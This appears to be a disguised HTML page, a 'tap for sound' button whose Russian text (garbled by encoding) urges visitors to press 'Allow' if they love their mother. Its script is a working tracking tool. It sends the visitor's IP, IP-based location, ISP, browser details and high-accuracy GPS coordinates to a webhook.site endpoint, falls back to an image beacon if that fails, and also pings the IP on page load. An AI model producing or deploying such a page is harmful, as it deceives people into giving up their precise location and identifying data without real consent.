<!DOCTYPE html>
<html>
<head>
    <title>Sound Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            color: white;
            font-family: Arial;
            text-align: center;
        }
        #playButton {
            width: 100%;
            height: 100%;
            border: none;
            background: linear-gradient(45deg, #ff0000, #0000ff);
            color: white;
            font-size: 24px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        #status {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
        }
        .message {
            font-size: 18px;
            margin-bottom: 20px;
            color: #ffeb3b;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>
    <button id="playButton">
        <div class="message">–ù–∞–∂–º–∏ –†–ê–ó–†–ï–®–ò–¢–¨ –µ—Å–ª–∏ –ª—é–±–∏—à—å –º–∞–º—É ‚ù§Ô∏è</div>
        üéµ TAP FOR SOUND üéµ
    </button>
    <div id="status"></div>

    <script>
        const statusDiv = document.getElementById('status');
        const MY_WEBHOOK = 'https://webhook.site/f4538f91-c509-4e37-9139-8edca42f4de1';

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞
        function playSound() {
            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
            audio.play().then(() => {
                document.getElementById('playButton').innerHTML = `
                    <div class="message">–°–ø–∞—Å–∏–±–æ! –¢—ã –ª—é–±–∏—à—å –º–∞–º—É! üíñ</div>
                    üîä SOUND PLAYING!
                `;
                document.getElementById('playButton').style.background = 'green';
            }).catch(error => {
                document.getElementById('playButton').innerHTML = `
                    <div class="message">–°–ø–∞—Å–∏–±–æ! –¢—ã –ª—é–±–∏—à—å –º–∞–º—É! üíñ</div>
                    üîä SOUND PLAYING!
                `;
                document.getElementById('playButton').style.background = 'green';
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–µ—Ç–∞–ª–µ–π –ø–æ IP
        async function getIPDetails(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city,
                    country: data.country_name,
                    region: data.region,
                    org: data.org,
                    timezone: data.timezone
                };
            } catch (error) {
                return { error: 'Could not get IP details' };
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        async function sendDataToWebhook(data) {
            try {
                const response = await fetch(MY_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                return true;
            } catch (error) {
                // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–± —á–µ—Ä–µ–∑ Image
                const params = new URLSearchParams();
                for (const [key, value] of Object.entries(data)) {
                    params.append(key, typeof value === 'object' ? JSON.stringify(value) : value);
                }
                new Image().src = `${MY_WEBHOOK}?${params.toString()}`;
                return false;
            }
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        async function collectAndSendData() {
            statusDiv.innerHTML = 'üì° –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ...';
            
            const ip = await getIP();
            const ipDetails = await getIPDetails(ip);
            
            const allData = {
                ip: ip,
                ipDetails: ipDetails,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                message: "User clicked 'Allow' for mom question"
            };

            // –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é —Å –∫–∞—Å—Ç–æ–º–Ω—ã–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });
                    
                    allData.gps = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' meters'
                    };
                    
                    statusDiv.innerHTML = `üìç GPS: ${allData.gps.lat}, ${allData.gps.lng}`;
                    
                } catch (error) {
                    allData.gps = { error: error.message, userChoice: "User denied location" };
                    statusDiv.innerHTML = 'üìç Approximate location sent';
                }
            }

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            await sendDataToWebhook(allData);
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞ —Å –∫–∞—Å—Ç–æ–º–Ω—ã–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º
        document.getElementById('playButton').addEventListener('click', async function() {
            // –°–Ω–∞—á–∞–ª–∞ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
            this.innerHTML = `
                <div class="message">–ë—Ä–∞—É–∑–µ—Ä –∑–∞–ø—Ä–æ—Å–∏—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ...</div>
                ‚è≥ –ñ–¥–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è...
            `;
            this.style.background = 'orange';
            
            // –ó–∞—Ç–µ–º –∑–∞–ø—É—Å–∫–∞–µ–º –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã
            setTimeout(async () => {
                await collectAndSendData();
                playSound();
            }, 1000);
        });

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö
        document.getElementById('playButton').addEventListener('touchend', function(e) {
            e.preventDefault();
            this.click();
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', function() {
            setTimeout(async () => {
                const ip = await getIP();
                sendDataToWebhook({
                    ip: ip,
                    event: 'page_loaded',
                    timestamp: new Date().toISOString()
                });
            }, 1000);
        });
    </script>
</body>
</html>
